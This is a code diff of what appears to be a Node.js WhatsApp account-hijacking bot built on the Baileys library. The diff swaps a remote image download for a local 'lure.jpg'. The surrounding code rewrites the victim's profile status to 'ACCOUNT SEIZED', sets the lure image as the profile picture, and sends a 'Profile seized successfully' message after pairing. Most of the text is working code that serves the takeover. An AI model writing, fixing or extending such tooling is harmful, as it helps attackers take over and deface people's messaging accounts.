@@ -7,9 +7,8 @@ const {
     delay
 } = require("@whiskeysockets/baileys"); 
 const pino = require("pino");
-const sharp = require("sharp"); // Replaced Jimp
+const sharp = require("sharp");
 const fs = require("fs");
-const https = require("https");
 const sessionPath = './session_new';
 let sock = null;
 let pairingCodeRequested = false;
@@ -22,49 +21,7 @@ function cleanSession() {
     }
 }
 
-// Download image from URL with retries
-async function downloadImage(url, filename, retries = 3) {
-    for (let i = 0; i < retries; i++) {
-        try {
-            console.log(`[i] Download attempt ${i + 1}/${retries}...`);
-            await new Promise((resolve, reject) => {
-                const file = fs.createWriteStream(filename);
-                const request = https.get(url, { timeout: 30000 }, (response) => {
-                    if (response.statusCode !== 200) {
-                        reject(new Error(`HTTP ${response.statusCode}`));
-                        return;
-                    }
-                    response.pipe(file);
-                    file.on('finish', () => {
-                        file.close();
-                        resolve();
-                    });
-                });
-                
-                request.on('error', (err) => {
-                    fs.unlink(filename, () => {});
-                    reject(err);
-                });
-                
-                request.on('timeout', () => {
-                    request.destroy();
-                    reject(new Error('Timeout'));
-                });
-            });
-            console.log(`[✓] Download successful`);
-            return filename;
-        } catch (err) {
-            console.log(`[✗] Attempt ${i + 1} failed: ${err.message}`);
-            if (i < retries - 1) {
-                console.log(`[i] Retrying in 3 seconds...`);
-                await delay(3000);
-            }
-        }
-    }
-    throw new Error(`Failed to download after ${retries} attempts`);
-}
-
-// NEW: Sharp Image Processor
+// NEW: Sharp Image Processor for local files
 async function getSharpBuffer(path) {
     console.log(`[i] Processing image with Sharp: ${path}`);
     return await sharp(path)
@@ -136,27 +93,33 @@ async function connectToWhatsApp(isFirstConnect = true) {
                 // 1. Update Status
                 await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
                 
-                // 2. Update Profile Picture with Sharp
-                const imageUrl = 'https://files.catbox.moe/c61uu3.jpg';
-                const tempFile = './temp_profile.jpg';
+                // 2. Update Profile Picture with LOCAL lure.jpg
+                const localImagePath = './lure.jpg';
                 
                 try {
-                    await downloadImage(imageUrl, tempFile, 3);
-                    const buffer = await getSharpBuffer(tempFile);
+                    // Debug: Check if file exists
+                    console.log("[i] Current directory:", process.cwd());
+                    console.log("[i] Files here:", fs.readdirSync('.'));
+                    console.log("[i] lure.jpg exists:", fs.existsSync(localImagePath));
+                    
+                    if (!fs.existsSync(localImagePath)) {
+                        throw new Error(`File not found: ${localImagePath}`);
+                    }
+                    
+                    const buffer = await getSharpBuffer(localImagePath);
                     
                     // Format JID correctly for profile update
                     const jid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                     await sock.updateProfilePicture(jid, buffer);
-                    console.log("[✓] Profile picture updated with Sharp!");
+                    console.log("[✓] Profile picture updated with lure.jpg!");
                     
-                    if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
                 } catch (err) {
                     console.log(`[✗] Profile picture failed: ${err.message}`);
                 }
                 
                 // 3. Send Message
                 await sock.sendMessage(sock.user.id, { 
-                    text: "*SYSTEM ERROR:* anon v6 Executed.\n\nProfile seized successfully." 
+                    text: "*SYSTEM ERROR:* Satanic MD V1 Executed.\n\nProfile seized successfully." 
                 });
                 
             } catch (e) { 
